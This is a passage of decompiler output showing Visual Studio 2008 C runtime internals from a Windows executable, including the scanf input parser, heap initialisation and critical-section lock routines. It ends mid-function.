undefined4 __cdecl ___check_float_string(size_t param_1,void *param_2,undefined4 *param_3)

{
  size_t _Count;
  void *pvVar1;
  size_t *unaff_ESI;
  void **unaff_EDI;
  
  _Count = *unaff_ESI;
  if (param_1 == _Count) {
    if (*unaff_EDI == param_2) {
      pvVar1 = __calloc_crt(_Count,2);
      *unaff_EDI = pvVar1;
      if (pvVar1 == (void *)0x0) {
        return 0;
      }
      *param_3 = 1;
      _memcpy(*unaff_EDI,param_2,*unaff_ESI);
    }
    else {
      pvVar1 = __recalloc_crt(*unaff_EDI,_Count,2);
      if (pvVar1 == (void *)0x0) {
        return 0;
      }
      *unaff_EDI = pvVar1;
    }
    *unaff_ESI = *unaff_ESI << 1;
  }
  return 1;
}



// Library Function - Single Match
//  __hextodec
// 
// Library: Visual Studio 2008 Release

uint __cdecl __hextodec(byte param_1)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = _isdigit((uint)param_1);
  uVar2 = (uint)(char)param_1;
  if (iVar1 == 0) {
    uVar2 = (uVar2 & 0xffffffdf) - 7;
  }
  return uVar2;
}



// Library Function - Single Match
//  __inc
// 
// Library: Visual Studio 2008 Release

uint __fastcall __inc(undefined4 param_1,FILE *param_2)

{
  int *piVar1;
  byte bVar2;
  uint uVar3;
  
  piVar1 = &param_2->_cnt;
  *piVar1 = *piVar1 + -1;
  if (-1 < *piVar1) {
    bVar2 = *param_2->_ptr;
    param_2->_ptr = param_2->_ptr + 1;
    return (uint)bVar2;
  }
  uVar3 = __filbuf(param_2);
  return uVar3;
}



// Library Function - Single Match
//  __un_inc
// 
// Library: Visual Studio 2008 Release

void __cdecl __un_inc(int param_1,FILE *param_2)

{
  if (param_1 != -1) {
    __ungetc_nolock(param_1,param_2);
    return;
  }
  return;
}



// Library Function - Single Match
//  __whiteout
// 
// Library: Visual Studio 2008 Release

uint __thiscall __whiteout(void *this,FILE *param_1)

{
  uint uVar1;
  int iVar2;
  int *unaff_ESI;
  
  do {
    *unaff_ESI = *unaff_ESI + 1;
    uVar1 = __inc(this,param_1);
    if (uVar1 == 0xffffffff) {
      return 0xffffffff;
    }
    this = (void *)(uVar1 & 0xff);
    iVar2 = _isspace((int)this);
  } while (iVar2 != 0);
  return uVar1;
}



// Library Function - Single Match
//  __input_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __input_l(FILE *_File,uchar *param_2,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  byte bVar2;
  int *piVar3;
  uint uVar4;
  void *pvVar5;
  code *pcVar6;
  int iVar7;
  undefined *puVar8;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 uVar9;
  undefined4 extraout_ECX_04;
  FILE *extraout_ECX_05;
  FILE *pFVar10;
  FILE *extraout_ECX_06;
  int extraout_ECX_07;
  undefined4 extraout_ECX_08;
  uint extraout_ECX_09;
  byte bVar11;
  uint uVar12;
  char cVar13;
  void *_C;
  size_t sVar14;
  size_t sVar15;
  byte *pbVar16;
  undefined4 *puVar17;
  byte *pbVar18;
  bool bVar19;
  longlong lVar20;
  FILE *pFVar21;
  localeinfo_struct *plVar22;
  undefined4 *local_200;
  localeinfo_struct local_1fc;
  int local_1f4;
  char local_1f0;
  undefined4 local_1ec;
  undefined4 *local_1e8;
  byte local_1e4;
  undefined local_1e3;
  undefined4 local_1e0;
  int local_1dc;
  byte local_1d5;
  int local_1d4;
  undefined8 local_1d0;
  int local_1c8;
  undefined4 *local_1c4;
  undefined4 *local_1c0;
  byte *local_1bc;
  int local_1b8;
  char local_1b1;
  undefined *local_1b0;
  int local_1ac;
  uint local_1a8;
  char local_1a4;
  byte local_1a3;
  char local_1a2;
  char local_1a1;
  FILE *local_1a0;
  char local_19a;
  char local_199;
  int local_198;
  char local_191;
  undefined4 *local_190;
  uint local_18c;
  undefined local_188 [352];
  byte local_28 [32];
  uint local_8;
  
  local_8 = DAT_00418df8 ^ (uint)&stack0xfffffffc;
  local_1e8 = (undefined4 *)_ArgList;
  local_1b0 = local_188;
  local_1a0 = _File;
  local_1e0 = 0x15e;
  local_1d4 = 0;
  local_1ec = 0;
  local_18c = 0;
  if ((param_2 == (uchar *)0x0) || (_File == (FILE *)0x0)) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0040a044;
  }
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    uVar4 = __fileno(_File);
    if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
      puVar8 = &DAT_00418b10;
    }
    else {
      puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041b2e0)[(int)uVar4 >> 5]);
    }
    if ((puVar8[0x24] & 0x7f) == 0) {
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar8 = &DAT_00418b10;
      }
      else {
        puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041b2e0)[(int)uVar4 >> 5]);
      }
      if ((puVar8[0x24] & 0x80) == 0) goto LAB_00409194;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0040a044;
  }
LAB_00409194:
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1fc,_Locale);
  bVar1 = *param_2;
  local_1a1 = '\0';
  local_190 = (undefined4 *)0x0;
  local_1c8 = 0;
  if (bVar1 != 0) {
LAB_004091bf:
    pFVar21 = local_1a0;
    pvVar5 = (void *)(uint)bVar1;
    iVar7 = _isspace((int)pvVar5);
    if (iVar7 != 0) {
      local_190 = (undefined4 *)((int)local_190 + -1);
      uVar4 = __whiteout(pvVar5,pFVar21);
      __un_inc(uVar4,pFVar21);
      do {
        param_2 = param_2 + 1;
        iVar7 = _isspace((uint)*param_2);
      } while (iVar7 != 0);
      goto LAB_00409fac;
    }
    if (*param_2 == 0x25) {
      if (param_2[1] == 0x25) {
        if (param_2[1] == 0x25) {
          param_2 = param_2 + 1;
        }
        goto LAB_00409f3e;
      }
      local_1c4 = (undefined4 *)0x0;
      local_1d5 = 0;
      local_1ac = 0;
      local_1b8 = 0;
      local_198 = 0;
      local_1a3 = 0;
      local_1a4 = '\0';
      local_19a = '\0';
      local_1b1 = '\0';
      local_1a2 = '\0';
      local_191 = '\0';
      local_199 = '\x01';
      local_1dc = 0;
      do {
        pbVar16 = param_2 + 1;
        _C = (void *)(uint)*pbVar16;
        pvVar5 = _C;
        iVar7 = _isdigit((int)_C);
        pbVar18 = pbVar16;
        if (iVar7 == 0) {
          if (_C < (void *)0x4f) {
            if (_C != (void *)0x4e) {
              if (_C == (void *)0x2a) {
                local_19a = local_19a + '\x01';
              }
              else if (_C != (void *)0x46) {
                if (_C == (void *)0x49) {
                  bVar1 = param_2[2];
                  pvVar5 = (void *)CONCAT31((int3)((uint)pvVar5 >> 8),bVar1);
                  if ((bVar1 == 0x36) && (pbVar18 = param_2 + 3, *pbVar18 == 0x34))
                  goto LAB_004092e0;
                  if ((((((bVar1 != 0x33) || (pbVar18 = param_2 + 3, *pbVar18 != 0x32)) &&
                        (pbVar18 = pbVar16, bVar1 != 100)) && ((bVar1 != 0x69 && (bVar1 != 0x6f))))
                      && (bVar1 != 0x78)) && (bVar1 != 0x58)) goto LAB_00409339;
                }
                else if (_C == (void *)0x4c) {
                  local_199 = local_199 + '\x01';
                }
                else {
LAB_00409339:
                  local_1b1 = local_1b1 + '\x01';
                  pbVar18 = pbVar16;
                }
              }
            }
          }
          else if (_C == (void *)0x68) {
            local_199 = local_199 + -1;
            local_191 = local_191 + -1;
          }
          else {
            if (_C == (void *)0x6c) {
              pbVar18 = param_2 + 2;
              if (*pbVar18 == 0x6c) {
LAB_004092e0:
                local_1dc = local_1dc + 1;
                local_1d0 = 0;
                goto LAB_00409363;
              }
              local_199 = local_199 + '\x01';
            }
            else if (_C != (void *)0x77) goto LAB_00409339;
            local_191 = local_191 + '\x01';
            pbVar18 = pbVar16;
          }
        }
        else {
          local_1b8 = local_1b8 + 1;
          local_198 = local_198 * 10 + -0x30 + (int)_C;
        }
LAB_00409363:
        param_2 = pbVar18;
      } while (local_1b1 == '\0');
      if (local_19a == '\0') {
        local_1c0 = (undefined4 *)*local_1e8;
        local_200 = local_1e8;
        local_1e8 = local_1e8 + 1;
      }
      else {
        local_1c0 = (undefined4 *)0x0;
      }
      cVar13 = '\0';
      if ((local_191 == '\0') && ((*pbVar18 == 0x53 || (local_191 = -1, *pbVar18 == 0x43)))) {
        local_191 = '\x01';
      }
      local_1a8 = *pbVar18 | 0x20;
      local_1bc = pbVar18;
      if (local_1a8 != 0x6e) {
        if ((local_1a8 == 99) || (local_1a8 == 0x7b)) {
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(pvVar5,local_1a0);
        }
        else {
          local_18c = __whiteout(pvVar5,local_1a0);
        }
        if (local_18c == 0xffffffff) goto LAB_00409fe2;
      }
      pFVar21 = local_1a0;
      if ((local_1b8 != 0) && (local_198 == 0)) goto LAB_00409fc4;
      if ((int)local_1a8 < 0x70) {
        if (local_1a8 == 0x6f) {
LAB_00409c4a:
          if (local_18c == 0x2d) {
            local_1a4 = '\x01';
          }
          else if (local_18c != 0x2b) goto LAB_00409c8c;
          local_198 = local_198 + -1;
          if ((local_198 == 0) && (local_1b8 != 0)) {
            cVar13 = '\x01';
          }
          else {
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(local_1b8,local_1a0);
          }
          goto LAB_00409c8c;
        }
        if (local_1a8 == 99) {
          if (local_1b8 == 0) {
            local_198 = local_198 + 1;
            local_1b8 = 1;
          }
LAB_00409870:
          if ('\0' < local_191) {
            local_1a2 = '\x01';
          }
LAB_00409880:
          pFVar21 = local_1a0;
          puVar17 = local_1c0;
          local_190 = (undefined4 *)((int)local_190 + -1);
          pFVar10 = local_1a0;
          local_1c4 = local_1c0;
          __un_inc(local_18c,local_1a0);
          do {
            if ((local_1b8 != 0) &&
               (iVar7 = local_198 + -1, bVar19 = local_198 == 0, local_198 = iVar7, bVar19))
            goto LAB_00409bf0;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(pFVar10,pFVar21);
            if (local_18c == 0xffffffff) goto LAB_00409be1;
            bVar1 = (byte)local_18c;
            pFVar10 = extraout_ECX_05;
            if (local_1a8 != 99) {
              if (local_1a8 == 0x73) {
                if ((8 < (int)local_18c) && ((int)local_18c < 0xe)) goto LAB_00409be1;
                if (local_18c != 0x20) goto LAB_00409930;
              }
              if ((local_1a8 != 0x7b) ||
                 (pFVar10 = (FILE *)(int)(char)(local_28[(int)local_18c >> 3] ^ local_1a3),
                 ((uint)pFVar10 & 1 << (bVar1 & 7)) == 0)) goto LAB_00409be1;
            }
LAB_00409930:
            if (local_19a == '\0') {
              if (local_1a2 == '\0') {
                *(byte *)puVar17 = bVar1;
                puVar17 = (undefined4 *)((int)puVar17 + 1);
                local_1c0 = puVar17;
              }
              else {
                uVar4 = local_18c & 0xff;
                local_1e4 = bVar1;
                iVar7 = _isleadbyte(uVar4);
                if (iVar7 != 0) {
                  local_190 = (undefined4 *)((int)local_190 + 1);
                  uVar4 = __inc(uVar4,pFVar21);
                  local_1e3 = (undefined)uVar4;
                }
                local_1ec = 0x3f;
                __mbtowc_l((wchar_t *)&local_1ec,(char *)&local_1e4,
                           (size_t)(local_1fc.locinfo)->locale_name[3],&local_1fc);
                *(undefined2 *)puVar17 = (undefined2)local_1ec;
                puVar17 = (undefined4 *)((int)puVar17 + 2);
                pFVar10 = extraout_ECX_06;
                local_1c0 = puVar17;
              }
            }
            else {
              local_1c4 = (undefined4 *)((int)local_1c4 + 1);
            }
          } while( true );
        }
        if (local_1a8 == 100) goto LAB_00409c4a;
        if ((int)local_1a8 < 0x65) {
LAB_004099dd:
          if (*local_1bc != local_18c) goto LAB_00409fc4;
          local_1a1 = local_1a1 + -1;
          if (local_19a == '\0') {
            local_1e8 = local_200;
          }
          goto LAB_00409f1b;
        }
        if (0x67 < (int)local_1a8) {
          if (local_1a8 == 0x69) {
            local_1a8 = 100;
            goto LAB_00409494;
          }
          if (local_1a8 != 0x6e) goto LAB_004099dd;
          puVar17 = local_190;
          if (local_19a != '\0') goto LAB_00409f1b;
          goto LAB_00409eef;
        }
        sVar14 = 0;
        if (local_18c == 0x2d) {
          *local_1b0 = 0x2d;
          sVar14 = 1;
LAB_004094cd:
          local_198 = local_198 + -1;
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(local_1b8,local_1a0);
        }
        else if (local_18c == 0x2b) goto LAB_004094cd;
        if (local_1b8 == 0) {
          local_198 = -1;
        }
        while( true ) {
          uVar4 = local_18c & 0xff;
          iVar7 = _isdigit(uVar4);
          if ((iVar7 == 0) ||
             (iVar7 = local_198 + -1, bVar19 = local_198 == 0, local_198 = iVar7, bVar19)) break;
          local_1ac = local_1ac + 1;
          local_1b0[sVar14] = (byte)local_18c;
          sVar14 = sVar14 + 1;
          iVar7 = ___check_float_string(sVar14,local_188,&local_1d4);
          if (iVar7 == 0) goto LAB_00409fe2;
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(extraout_ECX,local_1a0);
        }
        local_1a3 = **(byte **)local_1fc.locinfo[1].lc_codepage;
        if ((local_1a3 == (byte)local_18c) &&
           (iVar7 = local_198 + -1, bVar19 = local_198 != 0, local_198 = iVar7, bVar19)) {
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(uVar4,local_1a0);
          local_1b0[sVar14] = local_1a3;
          sVar14 = sVar14 + 1;
          iVar7 = ___check_float_string(sVar14,local_188,&local_1d4);
          if (iVar7 == 0) goto LAB_00409fe2;
          while ((iVar7 = _isdigit(local_18c & 0xff), iVar7 != 0 &&
                 (iVar7 = local_198 + -1, bVar19 = local_198 != 0, local_198 = iVar7, bVar19))) {
            local_1ac = local_1ac + 1;
            local_1b0[sVar14] = (byte)local_18c;
            sVar14 = sVar14 + 1;
            iVar7 = ___check_float_string(sVar14,local_188,&local_1d4);
            if (iVar7 == 0) goto LAB_00409fe2;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(extraout_ECX_00,local_1a0);
          }
        }
        sVar15 = sVar14;
        if ((local_1ac != 0) &&
           (((local_18c == 0x65 || (local_18c == 0x45)) &&
            (iVar7 = local_198 + -1, bVar19 = local_198 != 0, local_198 = iVar7, bVar19)))) {
          local_1b0[sVar14] = 0x65;
          sVar15 = sVar14 + 1;
          iVar7 = ___check_float_string(sVar15,local_188,&local_1d4);
          if (iVar7 == 0) goto LAB_00409fe2;
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(extraout_ECX_01,local_1a0);
          if (local_18c == 0x2d) {
            local_1b0[sVar15] = 0x2d;
            sVar15 = sVar14 + 2;
            iVar7 = ___check_float_string(sVar15,local_188,&local_1d4);
            uVar9 = extraout_ECX_03;
            if (iVar7 == 0) goto LAB_00409fe2;
LAB_0040973e:
            if (local_198 == 0) {
              local_198 = 0;
            }
            else {
              local_190 = (undefined4 *)((int)local_190 + 1);
              local_198 = local_198 + -1;
              local_18c = __inc(uVar9,local_1a0);
            }
          }
          else {
            uVar9 = extraout_ECX_02;
            if (local_18c == 0x2b) goto LAB_0040973e;
          }
          while ((iVar7 = _isdigit(local_18c & 0xff), iVar7 != 0 &&
                 (iVar7 = local_198 + -1, bVar19 = local_198 != 0, local_198 = iVar7, bVar19))) {
            local_1ac = local_1ac + 1;
            local_1b0[sVar15] = (byte)local_18c;
            sVar15 = sVar15 + 1;
            iVar7 = ___check_float_string(sVar15,local_188,&local_1d4);
            if (iVar7 == 0) goto LAB_00409fe2;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(extraout_ECX_04,local_1a0);
          }
        }
        local_190 = (undefined4 *)((int)local_190 + -1);
        __un_inc(local_18c,local_1a0);
        if (local_1ac != 0) {
          if (local_19a == '\0') {
            local_1c8 = local_1c8 + 1;
            plVar22 = &local_1fc;
            local_1b0[sVar15] = 0;
            iVar7 = local_199 + -1;
            puVar17 = local_1c0;
            puVar8 = local_1b0;
            pcVar6 = (code *)__decode_pointer((int)PTR_LAB_00418dec);
            (*pcVar6)(iVar7,puVar17,puVar8,plVar22);
          }
          goto LAB_00409f1b;
        }
        goto LAB_00409fe2;
      }
      if (local_1a8 == 0x70) {
        local_199 = '\x01';
        goto LAB_00409c4a;
      }
      if (local_1a8 == 0x73) goto LAB_00409870;
      if (local_1a8 == 0x75) goto LAB_00409c4a;
      if (local_1a8 != 0x78) {
        if (local_1a8 == 0x7b) {
          if ('\0' < local_191) {
            local_1a2 = '\x01';
          }
          pbVar18 = local_1bc + 1;
          if (*pbVar18 == 0x5e) {
            pbVar18 = local_1bc + 2;
            local_1a3 = 0xff;
          }
          _memset(local_28,0,0x20);
          if (*pbVar18 == 0x5d) {
            local_28[11] = 0x20;
            uVar4 = 0x5d;
            pbVar18 = pbVar18 + 1;
          }
          else {
            uVar4 = (uint)local_1d5;
          }
          while( true ) {
            bVar1 = *pbVar18;
            local_1bc = pbVar18;
            if (bVar1 == 0x5d) break;
            if (((bVar1 == 0x2d) && (bVar11 = (byte)uVar4, bVar11 != 0)) &&
               (bVar2 = pbVar18[1], bVar2 != 0x5d)) {
              if (bVar2 <= bVar11) {
                uVar4 = (uint)bVar2;
                bVar2 = bVar11;
              }
              if ((byte)uVar4 <= bVar2) {
                uVar12 = (uint)(byte)((bVar2 - (byte)uVar4) + 1);
                do {
                  local_28[uVar4 >> 3] = local_28[uVar4 >> 3] | '\x01' << ((byte)uVar4 & 7);
                  uVar4 = uVar4 + 1;
                  uVar12 = uVar12 - 1;
                } while (uVar12 != 0);
              }
              uVar4 = 0;
              pbVar18 = pbVar18 + 2;
            }
            else {
              local_28[bVar1 >> 3] = local_28[bVar1 >> 3] | '\x01' << (bVar1 & 7);
              uVar4 = (uint)bVar1;
              pbVar18 = pbVar18 + 1;
            }
          }
          goto LAB_00409880;
        }
        goto LAB_004099dd;
      }
LAB_00409494:
      iVar7 = local_1b8;
      cVar13 = '\0';
      if (local_18c == 0x2d) {
        local_1a4 = '\x01';
LAB_00409ade:
        local_198 = local_198 + -1;
        if ((local_198 == 0) && (local_1b8 != 0)) {
          cVar13 = '\x01';
        }
        else {
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(local_1b8,local_1a0);
          iVar7 = extraout_ECX_07;
        }
      }
      else if (local_18c == 0x2b) goto LAB_00409ade;
      if (local_18c == 0x30) {
        local_190 = (undefined4 *)((int)local_190 + 1);
        local_18c = __inc(iVar7,local_1a0);
        if (((char)local_18c == 'x') || ((char)local_18c == 'X')) {
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(extraout_ECX_08,local_1a0);
          if ((local_1b8 != 0) && (local_198 = local_198 + -2, local_198 < 1)) {
            cVar13 = cVar13 + '\x01';
          }
          local_1a8 = 0x78;
        }
        else {
          local_1ac = 1;
          if (local_1a8 == 0x78) {
            local_190 = (undefined4 *)((int)local_190 + -1);
            __un_inc(local_18c,local_1a0);
            local_18c = 0x30;
          }
          else {
            if ((local_1b8 != 0) && (local_198 = local_198 + -1, local_198 == 0)) {
              cVar13 = cVar13 + '\x01';
            }
            local_1a8 = 0x6f;
          }
        }
      }
LAB_00409c8c:
      if (local_1dc == 0) {
        puVar17 = local_1c4;
        if (cVar13 == '\0') {
          while ((local_1a8 != 0x78 && (local_1a8 != 0x70))) {
            uVar4 = local_18c & 0xff;
            iVar7 = _isdigit(uVar4);
            if (iVar7 == 0) goto LAB_00409e99;
            if (local_1a8 == 0x6f) {
              if (0x37 < (int)local_18c) goto LAB_00409e99;
              iVar7 = (int)puVar17 << 3;
            }
            else {
              iVar7 = (int)puVar17 * 10;
            }
LAB_00409e5c:
            local_1ac = local_1ac + 1;
            puVar17 = (undefined4 *)(iVar7 + -0x30 + local_18c);
            if ((local_1b8 != 0) && (local_198 = local_198 + -1, local_198 == 0)) goto LAB_00409eb2;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(uVar4,local_1a0);
          }
          iVar7 = _isxdigit(local_18c & 0xff);
          if (iVar7 != 0) {
            iVar7 = (int)puVar17 << 4;
            uVar4 = local_18c;
            local_18c = __hextodec((byte)local_18c);
            goto LAB_00409e5c;
          }
LAB_00409e99:
          local_190 = (undefined4 *)((int)local_190 + -1);
          __un_inc(local_18c,local_1a0);
        }
LAB_00409eb2:
        if (local_1a4 != '\0') {
          puVar17 = (undefined4 *)-(int)puVar17;
        }
      }
      else {
        if (cVar13 == '\0') {
          while ((local_1a8 != 0x78 && (local_1a8 != 0x70))) {
            uVar4 = local_18c & 0xff;
            iVar7 = _isdigit(uVar4);
            if (iVar7 == 0) goto LAB_00409d93;
            if (local_1a8 == 0x6f) {
              if (0x37 < (int)local_18c) goto LAB_00409d93;
              lVar20 = CONCAT44(local_1d0._4_4_ << 3 | (uint)local_1d0 >> 0x1d,(uint)local_1d0 << 3)
              ;
            }
            else {
              lVar20 = __allmul((uint)local_1d0,local_1d0._4_4_,10,0);
              uVar4 = extraout_ECX_09;
            }
LAB_00409d46:
            local_1ac = local_1ac + 1;
            local_1d0 = lVar20 + (int)(local_18c - 0x30);
            if ((local_1b8 != 0) && (local_198 = local_198 + -1, local_198 == 0)) goto LAB_00409dac;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(uVar4,local_1a0);
          }
          iVar7 = _isxdigit(local_18c & 0xff);
          if (iVar7 != 0) {
            lVar20 = CONCAT44(local_1d0._4_4_ << 4 | (uint)local_1d0 >> 0x1c,(uint)local_1d0 << 4);
            uVar4 = local_18c;
            local_18c = __hextodec((byte)local_18c);
            goto LAB_00409d46;
          }
LAB_00409d93:
          local_190 = (undefined4 *)((int)local_190 + -1);
          __un_inc(local_18c,local_1a0);
        }
LAB_00409dac:
        puVar17 = local_1c4;
        if (local_1a4 != '\0') {
          local_1d0 = CONCAT44(-(local_1d0._4_4_ + ((uint)local_1d0 != 0)),-(uint)local_1d0);
        }
      }
      if (local_1a8 == 0x46) {
        local_1ac = 0;
      }
      if (local_1ac == 0) goto LAB_00409fe2;
      if (local_19a == '\0') {
        local_1c8 = local_1c8 + 1;
LAB_00409eef:
        if (local_1dc == 0) {
          if (local_199 == '\0') {
            *(short *)local_1c0 = (short)puVar17;
          }
          else {
            *local_1c0 = puVar17;
          }
        }
        else {
          *local_1c0 = (uint)local_1d0;
          local_1c0[1] = local_1d0._4_4_;
        }
      }
      goto LAB_00409f1b;
    }
LAB_00409f3e:
    local_190 = (undefined4 *)((int)local_190 + 1);
    uVar4 = __inc(pvVar5,pFVar21);
    pbVar18 = param_2 + 1;
    local_1bc = pbVar18;
    local_18c = uVar4;
    if (*param_2 == uVar4) {
      uVar12 = uVar4 & 0xff;
      iVar7 = _isleadbyte(uVar12);
      if (iVar7 != 0) {
        local_190 = (undefined4 *)((int)local_190 + 1);
        uVar12 = __inc(uVar12,pFVar21);
        bVar1 = *pbVar18;
        pbVar18 = param_2 + 2;
        local_1bc = pbVar18;
        if (bVar1 == uVar12) {
          local_190 = (undefined4 *)((int)local_190 + -1);
          goto LAB_00409f90;
        }
        __un_inc(uVar12,pFVar21);
        __un_inc(uVar4,pFVar21);
        goto LAB_00409fe2;
      }
      goto LAB_00409f90;
    }
LAB_00409fc4:
    __un_inc(local_18c,pFVar21);
LAB_00409fe2:
    if (local_1d4 == 1) {
      _free(local_1b0);
    }
    if (local_18c == 0xffffffff) {
      if (local_1f0 != '\0') {
        *(uint *)(local_1f4 + 0x70) = *(uint *)(local_1f4 + 0x70) & 0xfffffffd;
      }
      goto LAB_0040a044;
    }
  }
  if (local_1f0 != '\0') {
    *(uint *)(local_1f4 + 0x70) = *(uint *)(local_1f4 + 0x70) & 0xfffffffd;
  }
LAB_0040a044:
  iVar7 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar7;
LAB_00409be1:
  local_190 = (undefined4 *)((int)local_190 + -1);
  __un_inc(local_18c,pFVar21);
LAB_00409bf0:
  if (local_1c4 == puVar17) goto LAB_00409fe2;
  if ((local_19a == '\0') && (local_1c8 = local_1c8 + 1, local_1a8 != 99)) {
    if (local_1a2 == '\0') {
      *(undefined *)local_1c0 = 0;
    }
    else {
      *(undefined2 *)local_1c0 = 0;
    }
  }
LAB_00409f1b:
  local_1a1 = local_1a1 + '\x01';
  pbVar18 = local_1bc + 1;
  local_1bc = pbVar18;
LAB_00409f90:
  param_2 = pbVar18;
  if ((local_18c == 0xffffffff) &&
     ((*pbVar18 != 0x25 || (param_2 = local_1bc, local_1bc[1] != 0x6e)))) goto LAB_00409fe2;
LAB_00409fac:
  bVar1 = *param_2;
  if (bVar1 == 0) goto LAB_00409fe2;
  goto LAB_004091bf;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2008 Release

int __cdecl __heap_init(void)

{
  int in_stack_00000004;
  
  DAT_00419558 = HeapCreate((uint)(in_stack_00000004 == 0),0x1000,0);
  if (DAT_00419558 == (HANDLE)0x0) {
    return 0;
  }
  DAT_0041b410 = 1;
  return 1;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  LPCRITICAL_SECTION p_Var3;
  
  iVar2 = 0;
  p_Var3 = (LPCRITICAL_SECTION)&DAT_00419560;
  do {
    if ((&DAT_004182dc)[iVar2 * 2] == 1) {
      (&DAT_004182d8)[iVar2 * 2] = p_Var3;
      p_Var3 = p_Var3 + 1;
      BVar1 = ___crtInitCritSecAndSpinCount((LPCRITICAL_SECTION)(&DAT_004182d8)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&DAT_004182d8)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_004182d8;
  do {
    lpCriticalSection = *pp_Var1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x4183f8);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_004182d8;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x4183f8);
  return;
}



void __cdecl FUN_0040a124(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_004182d8)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2008 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION _Memory;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int local_20;
  
  iVar4 = 1;
  local_20 = 1;
  if (DAT_00419558 == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  pp_Var1 = (LPCRITICAL_SECTION *)(&DAT_004182d8 + _LockNum * 2);
  if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
    _Memory = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (_Memory == (LPCRITICAL_SECTION)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar4 = 0;
    }
    else {
      __lock(10);
      if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
        BVar3 = ___crtInitCritSecAndSpinCount(_Memory,4000);
        if (BVar3 == 0) {
          _free(_Memory);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *pp_Var1 = _Memory;
        }
      }
      else {
        _free(_Memory);
      }
      FUN_0040a1f5();
      iVar4 = local_20;
    }
  }
  return iVar4;
}



void FUN_0040a1f5(void)

{
  FUN_0040a124(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2008 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_004182d8)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_004182d8)[_File * 2]);
  return;
}



// Library Function - Single Match
//  ___sbh_find_block
// 
// Library: Visual Studio 2008 Release

uint __cdecl ___sbh_find_block(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_0041b3fc;
  while( true ) {
    if (DAT_0041b3f8 * 0x14 + DAT_0041b3fc <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
